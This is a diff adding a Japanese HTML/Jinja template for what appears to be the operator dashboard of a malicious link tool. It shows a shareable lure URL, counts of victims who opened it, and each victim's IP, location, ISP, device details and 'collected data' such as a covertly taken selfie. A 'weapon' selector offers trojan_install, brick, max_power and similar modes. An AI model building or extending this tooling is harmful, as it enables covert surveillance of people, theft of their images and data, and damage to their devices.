@@ -1,1 +1,130 @@
-templates/virus_watch.html
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ link.name }} — 被害状況</title>
+<style>
+html,body{margin:0;background:#0f1115;color:#e6e9ef;
+  font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif;padding:14px}
+h1{font-size:18px}
+h3{font-size:14px;margin:18px 0 6px;color:#c7cddb}
+.dim{color:#8b93a7;font-size:12px;line-height:1.85}
+.mono{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:#8b93a7}
+.card{background:#171a21;border:1px solid #262b36;border-radius:10px;padding:12px;margin:8px 0}
+a.btn,button{padding:7px 13px;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  text-decoration:none;font-size:12px;border:1px solid #39415a;cursor:pointer}
+a.go{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
+.row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-top:8px}
+.tabs{display:flex;gap:6px;margin:6px 0 12px;flex-wrap:wrap}
+.tabs a{padding:7px 14px;border-radius:999px;background:#20242e;border:1px solid #39415a;
+  color:#c7cddb;text-decoration:none;font-size:12.5px}
+.tabs a.on{background:#4c8dff;border-color:#4c8dff;color:#fff;font-weight:600}
+table{width:100%;border-collapse:collapse;font-size:12px}
+th,td{text-align:left;padding:4px 6px;border-bottom:1px solid #232734;vertical-align:top}
+details{margin:6px 0;background:#11141a;border:1px solid #232734;border-radius:8px;padding:8px}
+summary{cursor:pointer;font-size:12.5px}
+.kv{display:grid;grid-template-columns:180px 1fr;gap:2px 8px;font-size:11.5px;margin-top:6px}
+.kv .k{color:#8b93a7;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+.kv .v{color:#c7cddb;font-family:ui-monospace,Menlo,monospace;word-break:break-all}
+img.shot{max-width:220px;border-radius:8px;border:1px solid #262b36;display:block;margin-top:6px}
+input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:#9aa3b2;
+  padding:7px 9px;background:#11141a;border:1px solid #262b36;border-radius:6px}
+select,input[type=text]{padding:5px 8px;background:#11141a;color:#e6e9ef;
+  border:1px solid #262b36;border-radius:6px}
+form.inline{display:inline;margin:0}
+</style></head><body>
+
+<div class="tabs">
+  <a href="{{ base }}/vp" class="on">🦠 兵器庫</a>
+  <a href="{{ base }}/gp">🆕 GPS</a>
+  <a href="{{ base }}/tracks">🗄 旧式</a>
+</div>
+
+<h1>{{ link.name }} <span class="mono">{{ code }}</span></h1>
+<div class="dim">{{ mode_label }} / 踏まれた回数 {{ total }} / {{ '有効' if link.active else '停止中' }}</div>
+<div class="dim">{{ mode_desc }}</div>
+
+<div class="card">
+  <div class="dim">相手に送るURL</div>
+  <div class="row">
+    <input class="url" id="shareurl" readonly value="{{ share }}" onclick="this.select()">
+    <button class="go" id="sharecopy" type="button">コピー</button>
+    <a class="btn go" href="{{ share }}" target="_blank">開いて確認</a>
+  </div>
+  {% if is_new %}<div class="dim" style="color:#7ee08a">✓ 作成しました。上のURLを送ってください。</div>{% endif %}
+</div>
+
+<h3>踏んだ端末（{{ total }}件）</h3>
+{% for h in hits %}
+<details>
+  <summary>
+    <span class="mono">{{ (h.ts or '')[:19] }}</span> /
+    {{ h.device or '不明' }} {{ h.os or '' }} / {{ h.browser or '不明' }}
+    {% if h.inapp %}（{{ h.inapp }}内）{% endif %}
+    {% if h.city %} / {{ h.city }}{% endif %}
+    <span class="mono"> #{{ h.id }}</span>
+  </summary>
+  <div class="kv">
+    <div class="k">IP</div><div class="v">{{ h.ip }}</div>
+    <div class="k">国 / 地域 / 都市</div><div class="v">{{ h.country or '-' }} / {{ h.city or '-' }}</div>
+    <div class="k">ISP</div><div class="v">{{ h.isp or '-' }}</div>
+    <div class="k">識別者ID</div><div class="v">{{ h.vid or '-' }}</div>
+    <div class="k">UA</div><div class="v">{{ h.ua }}</div>
+  </div>
+  {% set items = by_hit.get(h.id, []) %}
+  {% if items %}
+  <div style="margin-top:8px"><b style="font-size:12px">収集データ {{ items|length }}件</b></div>
+  <div class="kv">
+    {% for d in items %}
+      <div class="k">{{ d.key }}</div>
+      <div class="v">{{ d.value[:400] }}</div>
+      {% if d.key == 'selfie' %}<div class="k"></div><div class="v"><img class="shot" src="{{ d.value }}"></div>{% endif %}
+    {% endfor %}
+  </div>
+  {% else %}
+  <div class="dim" style="margin-top:6px">JSが動く前に離脱したか、データ未着です。</div>
+  {% endif %}
+</details>
+{% else %}
+<p class="dim">まだ踏まれていません。</p>
+{% endfor %}
+
+<h3>設定</h3>
+<form method="post" action="/vp/{{ code }}/update" class="card">
+  <label>名前 <input type="text" name="name" value="{{ link.name }}"></label>
+  <label>兵器
+    <select name="mode">
+      {% for m in ["trojan_link","trojan_install","max_power","brick","windows","sound","storage","mix"] %}
+      <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ m }}</option>
+      {% endfor %}
+    </select></label>
+  <label>飛び先 <input type="text" name="dest" value="{{ link.dest or '' }}"></label>
+  <label>メモ <input type="text" name="note" value="{{ link.note or '' }}"></label>
+  <label>状態
+    <select name="active">
+      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
+      <option value="0" {% if not link.active %}selected{% endif %}>停止中</option>
+    </select></label>
+  <button type="submit">保存</button>
+</form>
+<div class="row">
+  <form class="inline" method="post" action="/vp/{{ code }}/clear"
+        onsubmit="return confirm('記録を消しますか？')"><button type="submit">記録を消す</button></form>
+  <form class="inline" method="post" action="/vp/{{ code }}/delete"
+        onsubmit="return confirm('削除しますか？')"><button type="submit">削除</button></form>
+</div>
+
+<script>
+document.getElementById('sharecopy').addEventListener('click', function () {
+  var b = this, u = document.getElementById('shareurl').value;
+  function done() { b.textContent = 'コピーしました';
+    setTimeout(function () { b.textContent = 'コピー'; }, 1500); }
+  function fb() {
+    try { var t = document.createElement('textarea'); t.value = u;
+          t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
+          t.select(); document.execCommand('copy'); t.remove(); done(); } catch (e) {}
+  }
+  try { navigator.clipboard && navigator.clipboard.writeText
+          ? navigator.clipboard.writeText(u).then(done).catch(fb) : fb(); } catch (e) { fb(); }
+});
+</script>
+</body></html>
